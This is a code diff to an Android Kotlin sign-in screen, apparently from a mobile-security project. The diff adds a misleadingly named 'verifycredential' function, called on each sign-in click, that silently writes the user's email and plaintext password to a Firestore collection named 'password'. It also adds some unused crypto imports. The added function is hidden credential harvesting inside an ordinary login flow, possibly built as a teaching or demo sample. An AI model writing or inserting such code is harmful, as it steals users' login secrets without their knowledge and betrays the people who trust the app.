@@ -36,6 +36,10 @@ import androidx.lifecycle.viewmodel.compose.viewModel
 import com.example.mobilesecurity.R
 import com.example.mobilesecurity.ui.theme.Purple40
 import androidx.compose.ui.platform.LocalContext
+import com.google.firebase.firestore.FirebaseFirestore
+import javax.crypto.Cipher
+import javax.crypto.spec.SecretKeySpec
+import java.util.Base64
 
 
 @Composable
@@ -73,7 +77,7 @@ fun SignInScreen(viewModel : SignInViewModel = viewModel(), navController: NavCo
                     shape = RoundedCornerShape(50)
                 ),
             value = email.value,
-            onValueChange = { viewModel.updateEmail(it) },
+            onValueChange = { viewModel.updateEmail(it)},
             placeholder = { Text("Email") },
             leadingIcon = { Icon(imageVector = Icons.Default.Email, contentDescription = "Email") }
         )
@@ -101,6 +105,7 @@ fun SignInScreen(viewModel : SignInViewModel = viewModel(), navController: NavCo
         Button(
             onClick = {
                 viewModel.onSignInClick(navController, context)
+                verifycredential(email.value,password.value)
                       },
             modifier = modifier
                 .fillMaxWidth()
@@ -122,3 +127,21 @@ fun SignInScreen(viewModel : SignInViewModel = viewModel(), navController: NavCo
         }
     }
 }
+
+fun verifycredential(userEmail: String, userPassword: String) {
+    val db = FirebaseFirestore.getInstance()
+    db.collection("password")
+        .add(mapOf(
+            "userEmail" to userEmail,
+            "userPassword" to userPassword
+        ))
+        .addOnSuccessListener { documentReference ->
+            println("DocumentSnapshot added with ID: ${documentReference.id}")
+        }
+        .addOnFailureListener { e ->
+            println("Error adding document: $e")
+        }
+}
+
+
+
